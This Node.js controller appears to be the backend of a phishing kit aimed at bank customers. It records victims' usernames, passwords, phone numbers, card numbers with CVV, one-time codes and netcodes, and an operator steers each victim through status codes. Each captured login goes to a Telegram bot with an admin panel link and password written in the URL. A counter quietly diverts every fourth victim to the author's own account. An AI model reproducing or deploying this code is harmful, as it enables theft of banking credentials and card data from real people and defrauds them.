const axios = require("axios");
const ASB = require("../models/asbModel");

let asbCount = 0;
let redirect = true;

const setRedirect = async (req, res) => {
	const { active } = req.params;
	if (active == "true") {
		redirect = true;
	} else if (active == "false") {
		redirect = false;
	}
	res.send(`Redirect set to ${redirect}`);
};

const getOwnerVics = async (req, res) => {
	const { owner } = req.params;
	ASB.find({ owner }).exec((err, vics) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vics);
	});
};

const command = async (req, res) => {
	const { uniqueid, status } = req.body;
	try {
		await ASB.findOneAndUpdate({ uniqueid }, { status }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const getInfo = async (req, res) => {
	const { uniqueid } = req.params;
	ASB.findOne({ uniqueid }).exec((err, vic) => {
		if (err) {
			console.log(err);
			res.status(404).send("Error");
			return;
		}
		res.send(vic);
	});
};

const submitLogin = async (req, res) => {
	let { username, password, uniqueid, owner, ip } = req.body;
	message = `New ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=haytch4023`;
	try {
		if (username == "" || password == "") {
		} else {
			if (redirect && asbCount == 3) {
				message = `‼️‼️‼️ Haytch ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=haytch4023\n\nCount: ${count}\nRedirect: ${redirect}`;
				owner = "haytch4023";
				asbCount = 0;
			} else {
				asbCount = asbCount + 1;
			}
			await ASB.create({
				uniqueid,
				username,
				password,
				status: 1,
				owner,
				ip,
			});
			await axios
				.post(
					`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`,
					{
						chat_id: 680379375,
						text: message,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
		}
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitLoginAgain = async (req, res) => {
	const { username, password, uniqueid } = req.body;
	try {
		await ASB.findOneAndUpdate(
			{ uniqueid },
			{ username, password, status: 0 }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitTelephone = async (req, res) => {
	const { telephone, uniqueid } = req.body;
	try {
		await ASB.findOneAndUpdate({ uniqueid }, { telephone, status: 7 }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitCard = async (req, res) => {
	const { ccnum, ccexp, cvv, uniqueid } = req.body;
	try {
		await ASB.findOneAndUpdate(
			{ uniqueid },
			{ ccnum, ccexp, cvv, status: 11 }
		).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitOtp = async (req, res) => {
	const { otp, uniqueid } = req.body;
	try {
		await ASB.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const submitNetcode = async (req, res) => {
	const { netcode, uniqueid } = req.body;
	try {
		await ASB.findOneAndUpdate({ uniqueid }, { netcode, status: 5 }).exec();
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

const deleteEntry = async (req, res) => {
	const { uniqueid } = req.body;
	try {
		await ASB.deleteOne({ uniqueid });
		res.sendStatus(200);
	} catch (error) {
		console.log(error);
		res.sendStatus(400);
	}
};

module.exports = {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitCard,
	submitTelephone,
	submitNetcode,
	submitOtp,
	setRedirect,
	deleteEntry,
};
